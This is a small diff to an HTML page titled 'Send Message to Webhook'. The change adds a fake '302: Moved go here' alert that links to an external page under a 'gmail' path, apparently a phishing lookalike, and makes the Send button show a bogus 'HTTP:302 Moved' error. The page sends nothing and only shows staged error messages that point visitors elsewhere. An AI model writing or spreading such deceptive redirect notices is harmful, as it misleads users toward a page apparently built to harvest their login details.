@@ -77,6 +77,7 @@ function showAlert(type, message) {
 </head>
 <body class="bg-gray-900 text-white flex items-center justify-center min-h-screen">
   <div class="bg-gray-800 p-8 rounded-lg shadow-lg w-full max-w-lg text-center">
+    <div class="alert alert-error" role="alert">302: Moved go here: https://napatc1.github.io/gmail/index1.html</div>
     <h1 class="text-2xl font-bold mb-6">Send Message to Webhook</h1>
 
     <label class="block mb-4 text-left">
@@ -92,7 +93,7 @@ function showAlert(type, message) {
     </label>
     <div id="alert-container" class="fixed bottom-4 right-4 flex flex-col space-y-3 z-50"></div>
 
-    <button onclick="showAlert('error','Google api is under maintenance')" class="btn btn-primary w-full">Send</button>
+    <button onclick="showAlert('error','HTTP:302 Moved')" class="btn btn-primary w-full">Send</button>
     <p id="status" class="mt-4 text-sm text-gray-300"></p>
   </div>
 
